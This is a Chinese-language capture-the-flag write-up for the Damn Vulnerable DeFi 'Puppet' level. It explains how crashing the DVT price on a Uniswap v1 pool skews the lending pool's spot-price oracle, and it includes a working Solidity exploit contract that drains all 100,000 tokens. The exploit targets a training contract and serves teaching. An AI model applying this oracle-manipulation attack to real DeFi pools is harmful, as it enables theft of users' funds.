# Puppet (24/09/07)

## 题目介绍

> **有一个借出池，用户可以借入该死的宝贵代币（DVT）。要做到这一点，他们首先需要存入ETH借款金额的两倍作为抵押品。该池目前有100000个DVT的流动性。**
>
> **在旧的Uniswap v1交易所开设了一个DVT市场，目前有10个ETH和10个DVT的流动性。**
>
> **通过保存贷款池中的所有代币，然后将它们存入指定的恢复账户来通过挑战。你从25个ETH和1000个DVT开始平衡。**

## 合约分析

合约主要是一个池子，然后价格根据储备来进行计算，我们自身有25个eth去借的时候是不能借出来全部的token的。所以我们要利用我们开始的1000个DVT把池子价格砸下去等token的价格降低以后我们就可以借出来所有的token。

``` solidity
contract PuppetPool is ReentrancyGuard {
    using Address for address payable;

    uint256 public constant DEPOSIT_FACTOR = 2;

    address public immutable uniswapPair;
    DamnValuableToken public immutable token;

    mapping(address => uint256) public deposits;

    error NotEnoughCollateral();
    error TransferFailed();

    event Borrowed(address indexed account, address recipient, uint256 depositRequired, uint256 borrowAmount);

    constructor(address tokenAddress, address uniswapPairAddress) {
        token = DamnValuableToken(tokenAddress);
        uniswapPair = uniswapPairAddress;
    }

    // Allows borrowing tokens by first depositing two times their value in ETH
    function borrow(uint256 amount, address recipient) external payable nonReentrant {
        uint256 depositRequired = calculateDepositRequired(amount);

        if (msg.value < depositRequired) {
            revert NotEnoughCollateral();
        }

        if (msg.value > depositRequired) {
            unchecked {
                payable(msg.sender).sendValue(msg.value - depositRequired);
            }
        }

        unchecked {
            deposits[msg.sender] += depositRequired;
        }

        // Fails if the pool doesn't have enough tokens in liquidity
        if (!token.transfer(recipient, amount)) {
            revert TransferFailed();
        }

        emit Borrowed(msg.sender, recipient, depositRequired, amount);
    }

    function calculateDepositRequired(uint256 amount) public view returns (uint256) {
        return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
    }

    function _computeOraclePrice() private view returns (uint256) {
        // calculates the price of the token in wei according to Uniswap pair
        return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
    }
}

```



## 解题过程

1.利用手里的token砸盘降低价格。

2.砸盘以后token的价格特别便宜，然后我们就可以利用我们的25 eth借走全部的token。

3.把钱转到恢复地址。完成攻击

**POC**

``````solidity
contract Exploit is Test{
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
    uint256 constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 25e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;

    DamnValuableToken token;
    PuppetPool lendingPool;
    IUniswapV1Exchange uniswapV1Exchange;
    IUniswapV1Factory uniswapV1Factory;
    address public recovery;


    constructor(DamnValuableToken _token,PuppetPool _lendingpool,IUniswapV1Exchange _uniswapV1Exchange,address _recovery)payable {
        token=_token;
        lendingPool=_lendingpool;
        uniswapV1Exchange=_uniswapV1Exchange;
        recovery=_recovery;
    }

    function attack()payable public{
        token.approve(address(lendingPool), type(uint256).max);
        token.approve(address(uniswapV1Exchange), type(uint256).max);
        uint256 tokenBalance=token.balanceOf(address(this));
        uniswapV1Exchange.tokenToEthTransferInput(tokenBalance, 1, block.timestamp, address(this));
        uint256 ethamount=lendingPool.calculateDepositRequired(token.balanceOf(address(lendingPool)));
        lendingPool.borrow{value: 25 ether}(100000 *1e18, address(this));
        token.transfer(address(recovery), token.balanceOf(address(this)));
    }

    receive() external payable{}
}
``````